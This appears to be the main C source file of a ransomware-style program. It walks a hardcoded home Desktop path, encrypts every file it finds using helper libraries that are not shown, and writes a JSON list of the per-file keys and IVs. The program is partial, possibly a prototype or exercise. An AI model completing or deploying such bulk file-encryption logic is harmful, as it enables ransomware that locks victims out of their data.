#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include"lib/func.h"
#include"lib/struct.h"

/*
 * JSON
 * {"path":"/home/tarcisio/arquivo.enc", "key":"chave de criptografia", "iv":"vetor de inicializacao"}
 */

int main(){
    List *files = NULL;
    EncList *encrypted = NULL;
    List *not_encrypted = NULL;
    //char* start_path = get_start_path();
    char *start_path = "/home/tarcisio/Desktop/";

    find_files(&files, start_path);
    encrypt_files(files, &encrypted, &not_encrypted);
    save_into_file_encrypted_list(encrypted, start_path);
    //read_from_file_encrypted_files(&encrypted, start_path);
    //destroy(&files);
    //destroy_encrypted_list(&encrypted);

    return 0;
}
